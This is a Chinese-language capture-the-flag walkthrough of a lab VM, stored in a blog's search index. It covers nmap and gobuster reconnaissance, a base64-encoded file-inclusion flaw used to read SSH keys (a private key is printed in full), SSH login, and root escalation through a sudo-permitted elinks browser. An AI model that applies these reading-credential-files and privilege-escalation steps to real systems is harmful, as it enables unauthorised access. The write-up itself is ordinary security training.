<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>miao</title>
    <link href="/2025/06/18/miao/"/>
    <url>/2025/06/18/miao/</url>
    
    <content type="html"><![CDATA[<h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><h1 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24                                                    <br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-20 14:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00047s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0016s latency).<br>MAC Address: 08:00:27:6E:38:E1 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.29<br>Host is up (0.00062s latency).<br>MAC Address: 08:00:27:24:D4:4F (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.08 seconds<br></code></pre></td></tr></table></figure><p>靶机IP<code>192.168.2.29</code></p><h1 id="二、nmap扫描"><a href="#二、nmap扫描" class="headerlink" title="二、nmap扫描"></a>二、nmap扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --min-rate 10000 -p- 192.168.2.29<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-20 14:20 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.29<br>Host is up (0.00026s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:24:D4:4F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 4.62 seconds<br></code></pre></td></tr></table></figure><p>开放端口<code>22和80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -sC -O --min-rate 10000 -p22,80 192.168.2.29<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-20 14:25 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.29<br>Host is up (0.00049s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: \xF0\x9F\x9B\xA1\xEF\xB8\x8F ULTRA SECURITY SCANNER v12.7<br>MAC Address: 08:00:27:24:D4:4F (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.71 seconds<br></code></pre></td></tr></table></figure><h1 id="三、web渗透"><a href="#三、web渗透" class="headerlink" title="三、web渗透"></a>三、web渗透</h1><h2 id="1、访问80端口"><a href="#1、访问80端口" class="headerlink" title="1、访问80端口"></a>1、访问80端口</h2><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202504201427660.png"><br>存在一个扫描，同时要求必须使用<code>http或者https</code>开头<br><strong>没有想到这里是前端验证，可以绕过</strong></p><h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.29 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.29<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,html,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/index.php            (Status: 200) [Size: 3663]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 882236 / 882240 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>只发现一个<code>index.php</code>，没发现有用的信息</p><h2 id="3、文件保护LFI"><a href="#3、文件保护LFI" class="headerlink" title="3、文件保护LFI"></a>3、文件保护LFI</h2><p>使用<code>burpsuite</code>进行发包测试，发现存在文件包含，只不过经过base编码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202504201441425.png"><br>尝试读取其他文件<br><strong>一般建议先读取<code>authorized_keys</code>，再根据里面的私钥名，进行读取相应的文件</strong><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202504201444093.png"><br>发现是椭圆曲线的 SSH 公钥，根据本地 ssh-keygen 生成的私钥名 <code>id_ed25519</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202504201446626.png"><br>找到私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACDR/VIN9tNEPjKIB01fFZNR6oJ7lbRL7kviAqtTTo+2vQAAAJAOyOgjDsjo<br>IwAAAAtzc2gtZWQyNTUxOQAAACDR/VIN9tNEPjKIB01fFZNR6oJ7lbRL7kviAqtTTo+2vQ<br>AAAEAueT/YxGFBpXcz1mS+VGPLhKTNrr0XneEeWqz1fxt6O9H9Ug3200Q+MogHTV8Vk1Hq<br>gnuVtEvuS+ICq1NOj7a9AAAADHdlbGNvbWVAQW5qdgE=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>进行连接即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao]<br>└─$ <span class="hljs-built_in">sudo</span> ssh welcome@192.168.2.29 -i <span class="hljs-built_in">id</span><br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.29 (192.168.2.29)&#x27;</span> cant be established.<br>ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.<br>This key is not known by any other names.<br>Are you sure you want to <span class="hljs-built_in">continue</span> connecting (<span class="hljs-built_in">yes</span>/no/[fingerprint])? <span class="hljs-built_in">yes</span><br>Warning: Permanently added <span class="hljs-string">&#x27;192.168.2.29&#x27;</span> (ED25519) to the list of known hosts.<br>Linux Anjv 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sat Apr 19 02:09:44 2025 from 192.168.3.94<br>welcome@Anjv:~$ <br></code></pre></td></tr></table></figure><h2 id="4、读取user的flag"><a href="#4、读取user的flag" class="headerlink" title="4、读取user的flag"></a>4、读取user的flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">welcome@Anjv:~$ <span class="hljs-built_in">cat</span> user.txt<br>flag&#123;user-f15386efb52673b9f3f82fb8e05d09ab&#125;<br></code></pre></td></tr></table></figure><h1 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h1><h2 id="1、查看sudo-l"><a href="#1、查看sudo-l" class="headerlink" title="1、查看sudo -l"></a>1、查看sudo -l</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">welcome@Anjv:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> welcome on Anjv:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User welcome may run the following commands on Anjv:<br>    (ALL) NOPASSWD: /usr/bin/elinks<br></code></pre></td></tr></table></figure><p><code>elinks</code>是一个基于文本的网页浏览器</p><h2 id="2、可以执行shell"><a href="#2、可以执行shell" class="headerlink" title="2、可以执行shell"></a>2、可以执行shell</h2><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202504201455838.png"></p><h2 id="3、读取root的flag"><a href="#3、读取root的flag" class="headerlink" title="3、读取root的flag"></a>3、读取root的flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Anjv:/home/welcome# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-f15386efb52673b9f3f82fb8e05d09ab&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
